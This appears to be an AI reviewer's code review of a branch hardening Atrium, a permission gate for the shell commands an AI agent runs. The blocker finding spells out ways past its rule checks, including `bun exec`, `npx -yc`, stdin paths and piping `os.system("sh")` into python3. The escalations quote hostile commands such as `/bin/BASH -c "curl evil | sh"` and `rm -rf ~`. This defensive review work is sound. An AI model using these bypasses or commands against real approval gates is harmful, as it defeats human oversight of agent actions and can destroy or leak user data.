# Review (Round 3 / D-116): `M1-23-ui-gaps` (`agent/opus/M1-23-ui-gaps`, `8ba5d3f8..78de9bc9`)

> Saved by the orchestrator from the reviewer's report (D-116). Links are relative to the worktree. Argon's quota ran out right after this review (D-117).


- **Reviewer:** Gemini 4 Argon (High), read-only
- **Worker:** Claude Opus 5.5
- **Verdict:** **Approve with changes** (all Round-2 findings, Inbox `A`/`D`/`X` targeting, `pathScopeOffered`, `SAVE_MESSAGE`, `splitCommand` line breaks / nested braces, `globset` 0.4.21 class checks, and all 22 screenshots are fixed and verified; 1 remaining `commandRisk` finding with 3 small bypasses in [rule-form.ts](app/src/chat/rule-form.ts) is detailed below with an 8-line fix)

---

## Findings (Ordered by Severity; Safety Blockers First)

### 1. [BLOCKER] `commandRisk` still allows `bun exec` (`verbs` instead of `sub`), `npx -yc` / `npx -c'...'` short-option clusters, `/dev/stdin` / `/dev/fd/0`, and operand-less `command_exact` interpreter rules (`python3` in `echo … | python3`)

- **Location:** [rule-form.ts](app/src/chat/rule-form.ts#L103), [rule-form.ts](app/src/chat/rule-form.ts#L186-L205) (interacting with [shell.rs](crates/atrium-core/src/policy/shell.rs#L1227-L1256), [shell.rs](crates/atrium-core/src/policy/shell.rs#L2374), [deny.rs](crates/atrium-core/src/policy/deny.rs#L561), [deny.rs](crates/atrium-core/src/policy/deny.rs#L614-L626), and [engine.rs](crates/atrium-core/src/policy/engine.rs#L601-L619))
- **Evidence:**
  1. **`bun exec` is listed in `verbs` instead of `sub` ([rule-form.ts](app/src/chat/rule-form.ts#L103)):**
     ```ts
     ["bun", { short: "ep", long: ["--eval", "--print"], sub: ["eval", "repl"], verbs: ["run", "test", "x", "exec", "create", "build"] }],
     ```
     - In Bun (`bun exec --help`), `bun exec <script>` executes a **shell script string** directly in Bun's built-in bash-like shell (the equivalent of `sh -c <script>` or `npx -c <script>`), not a script file.
     - Because `"exec"` is in `verbs` rather than `sub`, `validateRule` permits `bun exec 'rm -rf build'` (both `command_prefix` and `command_exact`), `bun exec echo` (`command_prefix`), and `bun --silent exec 'sh'` (`command_exact`).
  2. **`PACKAGE_RUNNERS` (`npx`, `pnpx`, `bunx`, `uvx`, `pipx`) only checks exact `"-c"`, missing short-option clusters (`npx -yc 'sh'`) and attached arguments (`npx -c'sh'`) ([rule-form.ts](app/src/chat/rule-form.ts#L200)):**
     ```ts
     const code = args.find((w) => RUNNER_CODE.has(w.toLowerCase()) || w.toLowerCase().startsWith("--call="));
     ```
     - Unlike `INTERPRETERS` ([rule-form.ts](app/src/chat/rule-form.ts#L183), which checks `[...lw.slice(1)].some((c) => short.includes(c))`), `PACKAGE_RUNNERS` only checks `RUNNER_CODE.has(w.toLowerCase())` (`"-c"` or `"--call"`).
     - `npx` (`npm exec`, via `nopt`) expands short option clusters such as `npx -yc 'sh'` (`--yes --call 'sh'`) and attached values such as `npx -c'sh'`. Both pass `validateRule` as `command_exact`, and `npx prettier -yc 'sh'` / `npx prettier -c'sh'` pass as both `command_prefix` and `command_exact`.
  3. **Stdin paths (`/dev/stdin`, `/dev/fd/0`) and operand-less `command_exact` rules on interpreters/runners (`python3`, `python3 -u`, `node`, `perl`, `ruby`, `php`, `lua`, `osascript`, `npx`) pass `validateRule` ([rule-form.ts](app/src/chat/rule-form.ts#L186-L204)):**
     - Line 186 checks `if (operands.includes("-"))`, but [shell.rs](crates/atrium-core/src/policy/shell.rs#L2374) and [deny.rs](crates/atrium-core/src/policy/deny.rs#L561) also treat `"/dev/stdin"` and `"/dev/fd/0"` as standard input. `python3 /dev/stdin` and `node /dev/fd/0` pass `validateRule` for both `command_prefix` and `command_exact`.
     - For `command_exact`, line 189 (`if (prefix)`) is skipped, so `validateRule` allows `python3`, `python3 -u`, `node`, `perl`, `ruby`, `php`, `lua`, `osascript`, `deno`, `bun`, and `npx` with **no script/module/package operand at all** (`operands.length === 0`).
     - As [deny.rs](crates/atrium-core/src/policy/deny.rs#L614-L626) (`reads_stdin_as_code_at`) reflects, an interpreter invoked with no positional script argument reads code from standard input. In `shell.rs` / `engine.rs`, `|` does not add to `a.reasons` and `is_pipe_code` ([shell.rs](crates/atrium-core/src/policy/shell.rs#L1227-L1256)) does not lex piped `echo` output for non-shell interpreters; therefore, in a Home chat (where `echo` and `printf` are covered by `HOME_READONLY_COMMANDS`), a `CommandExact` allow rule for `["python3"]` (or `["python3", "-u"]`, `["node"]`, `["perl"]`, `["ruby"]`, `["osascript"]`) causes [engine.rs](crates/atrium-core/src/policy/engine.rs#L601-L619) to auto-allow `echo 'import os; os.system("sh")' | python3`.
- **Smallest fix:**
  1. In [rule-form.ts](app/src/chat/rule-form.ts#L103), move `"exec"` from `verbs` to `sub` on `bun`:
     ```ts
     ["bun", { short: "ep", long: ["--eval", "--print"], sub: ["eval", "repl", "exec"], verbs: ["run", "test", "x", "create", "build"] }],
     ```
  2. In [rule-form.ts](app/src/chat/rule-form.ts#L186-L196), refuse `"/dev/stdin"` and `"/dev/fd/0"` alongside `"-"`, and require a non-verb operand for `command_exact` too:
     ```ts
     const stdin = operands.find((o) => o === "-" || o === "/dev/stdin" || o === "/dev/fd/0");
     if (stdin) return { refuse: `A rule can't allow ${name} ${stdin}: it runs code read from its input, and Atrium wouldn't check it.` };
     const subcommand = operands[0];
     if (subcommand !== undefined && sub.includes(subcommand)) return { refuse: `A rule can't allow ${name} ${subcommand}: it runs code written on the command line, and Atrium wouldn't check it.` };
     const hasVerb = verbs.length > 0 && operands[0] !== undefined && verbs.includes(operands[0]);
     if (operands.length <= (hasVerb ? 1 : 0)) return { refuse: `A rule can't allow ${name} without the script it runs: without one, ${name} reads code from its input.` };
     ```
  3. In [rule-form.ts](app/src/chat/rule-form.ts#L199-L205), check short-option clusters for `'c'` and require a package operand for `command_exact` too:
     ```ts
     if (PACKAGE_RUNNERS.has(name)) {
       const code = args.find((w) => {
         const lw = w.toLowerCase();
         return RUNNER_CODE.has(lw) || lw.startsWith("--call=") || (isOption(w) && !lw.startsWith("--") && lw.slice(1).includes("c"));
       });
       if (code) return { refuse: `A rule can't allow ${name} ${code}: it runs a shell command, and Atrium wouldn't check it.` };
       if (prefix && (args[0] === undefined || args[0].startsWith("-"))) return { refuse: `A prefix rule on ${name} must name the package right after it, like ${name} prettier, with no options before it.` };
       if (!args.some((w) => !w.startsWith("-"))) return { refuse: `A rule on ${name} must name the package it runs, like ${name} prettier.` };
       return { warn: `This allows the package ${name} runs, whatever it does.` };
     }
     ```

---

## Verification of the 6 Prompt Items

### 1. Blocker 1 (Fail-Closed Rule Check & Ordinary Rules)
- **What is now sound:**
  - **Case and APFS folds:** `foldName` ([rule-form.ts](app/src/chat/rule-form.ts#L124-L127)) extracts the basename, lowercases (folding `K` `U+212A` → `k`), and folds `ſ` (`U+017F`) → `s`, matching `deny.rs` `lower`.
  - **`Object.prototype` safety:** All lookup tables (`SHELLS`, `RUNS_HERE`, `WRAPPERS`, `REMOTE_RUNNERS`, `INTERPRETERS`, `PWSH_SHORT`, `PACKAGE_RUNNERS`, `RUNNER_CODE`, `FIND_EXEC`, `RESERVED`) use `Set` or `Map`; `constructor`, `toString`, `__proto__`, `valueOf` no longer throw.
  - **Shells, `eval`/`source`/`.`, and wrappers:** Every shell in `shell.rs` `SHELLS`, `eval`/`source`/`.`, every wrapper in `shell.rs` `unwrap_reading`, and every privilege tool in `deny.rs` `PRIV` (`sudo`, `sudoedit`, `su`, `doas`, `pkexec`, `run0`, `runuser`, `setpriv`) is refused at `argv[0]` for both `command_prefix` and `command_exact`.
  - **Interpreter flags & subcommands:** Any single-dash option word on `INTERPRETERS` containing a code-flag letter anywhere (`-c'...'`, `-0e`, `-0777ne`, `-Ic`, `-pe`) is refused case-insensitively; long code flags with or without `=` are refused case-insensitively; `sub` (`eval`, `repl`) is checked on `operands[0]` (the first non-option word, catching `deno -q eval`, `bun --silent eval`); PowerShell option prefixes (`-c`, `-com`, `--command`, `/c`, `-e`, `-ec`, `-en`, `-cwa`, `-command:x`) are refused; `command_prefix` rules on interpreters and package runners require the script/package immediately after the command (or after a `deno`/`bun` verb), preventing `python3 -W ignore` from covering `python3 -W ignore -c …`; and all `command_prefix` allow rules on `find` are refused.
  - **Long-option abbreviations on real tools:** Verified against real `python3` (`python3 --c` → `Unknown option: --c`) and `node` (`node --ev` → `node: bad option: --ev`). Neither uses `getopt_long` prefix matching, and for `command_prefix` rules any leading `-` option is refused anyway.
  - **Leading env assignments:** Refused by `splitCommand` ([rule-form.ts](app/src/chat/rule-form.ts#L318-L320)) and ignored by `allow_covers` in `engine.rs` (`u.seg.assignments.is_empty()`).
  - **Remaining gaps:** Only the 3 items in Finding 1 above (`bun exec`, `npx -yc` / `npx -c'...'`, and `/dev/stdin` + operand-less `command_exact`).
- **False refusals check on ordinary rules:**
  - `cargo test` → `ok: true`, `warnings: []`
  - `npm run build` → `ok: true`, `warnings: []`
  - `git status` (and `git -c x=y status`) → `ok: true`, `warnings: []`
  - `python3 scripts/build.py` → `ok: true`, 1 warning
  - `node scripts/x.mjs` → `ok: true`, 1 warning
  - `ls` → `ok: true`, `warnings: []`
  - `rg foo` → `ok: true`, `warnings: []`
  - Exact rules with flags before the script/module (`python3 -m pytest`, `python3 -u build.py`, `npx -y prettier`, `find . -name x`) → `ok: true`.

### 2. Blocker 2 (Inbox `A`/`D`/`X` Targeting)
- **Verified sound across all 5 interaction paths ([InboxCard.tsx](app/src/ui/InboxCard.tsx#L93-L96), [InboxCard.tsx](app/src/ui/InboxCard.tsx#L183-L206), [batch.ts](app/src/chat/batch.ts#L62-L67)):**
  - **Tab / Shift+Tab:** `div.item` has `onFocusIn={() => setInboxPick(key())}`, so tabbing into any control inside a row (the row's `.open` button, a card's batch checkbox, or `Allow once`/`Always…`/`Deny`) updates `inboxPick` to that row. When focus is inside an approval card, `focusedCardKey(e.target)` returns its `data-batch-key`, and `keyTargets` filters `targets()` strictly by `t.key === focusedKey` with no fallback.
  - **Click:** Both `onPointerDown` and `onFocusIn` on `div.item` set `inboxPick(key())`. Clicking inside an `ApprovalCard` (`tabindex="-1"`) focuses the card or button, setting `focusedCardKey`.
  - **`J` / `K` (`ArrowDown` / `ArrowUp`):** `move` calls `setInboxPick(moveSelection(...))` and `list.focus({ preventScroll: true })`, moving DOM focus onto `.inbox-list` (where `focusedCardKey` is `null`), so subsequent `A`/`D`/`X` presses act on the newly picked row's thread.
  - **Card removal:** If a row/card leaves the inbox, the effect at [InboxCard.tsx](app/src/ui/InboxCard.tsx#L170-L173) resets `inboxPick` to `keys()[0] ?? null`, and `targets()` drops the removed card.
  - **Approval expires while focused:** The outer `<div class="ask" data-atrium-part="approval" data-batch-key={...} tabindex="-1">` remains mounted with its `data-batch-key` while the expired request is excluded from `targets()` (`!canAct(...)`). Pressing `A`, `D`, or `X` passes `focusedKey = "t1:0:req"` to `keyTargets`, which returns `[]` and never falls back to another card on the same thread or another thread.

### 3. Major 3 and Minors 4–5 (Including `globset` 0.4.21 Verification)
- **Major 3 (`pathScopeOffered`):** Fixed at [rule-form.ts](app/src/chat/rule-form.ts#L409-L415). Returns `true` only when `form.decision === "allow"` and `form.matcher === "path_glob" || (form.matcher === "any" && PATH_KINDS.includes(form.toolKind))`. `fetch`, `mcp`, `other`, `think`, and `execute` never offer or retain `path_scope`.
- **Minor 4 (`SAVE_MESSAGE`):** Fixed at [save.rs](app/src-tauri/src/save.rs#L62-L63) with `#[cfg(target_os = "macos")]`.
- **Minor 5b (`splitCommand` line breaks & nested braces):** Fixed at [rule-form.ts](app/src/chat/rule-form.ts#L236-L254). `/[\n\r]/.test(line)` is refused up front before quote scanning, and `expandsBraces` matches `shell.rs` lines 865–890 (depth counting, `,` or `..` at depth 1, stopping at blanks/operators, 256-char cap).
- **Minor 5a (`globSyntaxError` vs `globset` 0.4.21):** **The worker is right.** In `globset` 0.4.21's `Parser::parse_class`:
  1. Backslash escaping is only performed at top level in `Parser::parse`, not inside `Parser::parse_class`, so `[\]` is parsed as a valid character class containing a literal `\` (closing at `]`), while `[\` fails with unclosed character class.
  2. When a character range `a-z` finishes inside `parse_class`, `globset` sets `in_range = false` without clearing `last` (`Some('a')`), so a subsequent `-_` in `[a-z-_]` re-enters `in_range` and fails with `ErrorKind::InvalidRange('a', '_')` because `'a' > '_'`.
  Keeping `globSyntaxError` as-is and pinning those cases in [rule-form.test.ts](app/src/chat/rule-form.test.ts#L272-L277) accurately matches `globset` 0.4.21.

### 4. Regressions Check & Refreshed Screenshots
- **No regressions** in `InboxCard.tsx`, `RuleEditor.tsx`, `Settings.tsx`, or `m1-demo.ts`. Routing `decide` through `keyTargets(targets(), ...)` in `InboxCard.tsx` also ensures `A`/`D` only act on approvals that are `canAct(...)`.
- **Screenshots:** Inspected the refreshed light and dark screenshots in `docs/agents/handoffs/M1-23-ui-gaps/` (`settings-rule-editor-{light,dark}.png`, `settings-rule-editor-refused-{light,dark}.png`, `settings-rule-editor-shell-refused-{light,dark}.png`, `inbox-batch-selected-light.png`). `settings-rule-editor-*` no longer shows the path scope input on command rules, shows the updated command hint, and `settings-rule-editor-shell-refused-*` renders the `bash -c 'cargo test'` refusal cleanly.

### 5. Assessment of the 4 Escalations for the M1 Gate
1. **Engine case-sensitive shell and wrapper matching (`crates/atrium-core/src/policy/shell.rs`, `deny.rs`):**
   - **Agree — High importance for the M1 gate (recommend a small `atrium-core` fix before closing M1).** Unlike rule-editor checks, this affects `DefaultPolicy::evaluate` *even with no rules*: on case-insensitive APFS, `/bin/BASH -c "curl evil | sh"`, `/usr/bin/ENV rm -rf ~`, `/usr/bin/SUDO id`, and `/bin/baſh -c "..."` resolve to the real binaries on disk, but `shell.rs` compares `base(first)` case-sensitively (`SHELLS`, `unwrap_reading`, `payloads_of`, `env_payloads`) and `deny.rs` line 946 (`PRIV.contains(&b)`) is also case-sensitive, so wrappers aren't unwrapped, `-c` payloads aren't lexed, and `SUDO` misses `privilege-escalation`. Folding `base(cmd)` with `.to_lowercase().replace('ſ', "s")` in `shell.rs` and `deny.rs` closes this across the whole engine.
2. **No daemon-side `CreateRule` guard (`crates/atrium-daemon/src/commands.rs`):**
   - **Agree — Low for the M1 gate (Medium for defense-in-depth).** Contract §4 already treats any same-UID local process on the Unix socket as a trusted peer (and `Settings → Security` discloses this), so it is not an M1 gate blocker, though enforcing the shell/wrapper refusal in `create_rule` or `allow_covers` is good defense-in-depth.
3. **Engine `path_scope` semantics (`crates/atrium-core/src/policy/engine.rs`):**
   - **Agree — Low for the M1 gate.** `"Always…"` in `ledger.rs` always sets `path_scope: None`, and `pathScopeOffered` now restricts `pathScope` to `PATH_KINDS` allow rules, so no M1 UI path can produce a command rule or deny rule with `path_scope`. Can be addressed in M2 when folder/project workspaces land.
4. **Engine `find -exec` derived subcommands under `CommandPrefix` allow rules (`crates/atrium-core/src/policy/engine.rs`):**
   - **Agree — Low for the M1 gate now that Round 3 refuses all `command_prefix` allow rules on `find` (and `"Always…"` in `gate.rs` only creates `CommandExact` rules when `l.units.len() == 1`).** Worth tightening in `engine.rs` alongside the daemon `CreateRule` guard so socket-created prefix rules can't cover derived `-exec` units either.

---

## Commands Run

| Command | Result |
|---|---|
| `pnpm --dir app typecheck` | Passed (`tsc --noEmit`, 0 errors) |
| `pnpm --dir app test` | Passed (`19` test files, `350` tests passed in `1.76s`) |
| `pnpm --dir app build` | Passed (`vite v8.3.5`, built in `1.78s`; lazy chunks verified) |
| `cargo clippy -p atrium-app --all-targets -- -D warnings` | Passed (0 warnings) |
| `cargo test -p atrium-app --no-fail-fast` | Passed (`47` unit tests + `2` `delivery_shapes` integration tests) |
| `cargo fmt --all --check` | Passed (clean) |
| `git status --porcelain` | Clean (no untracked or modified files) |
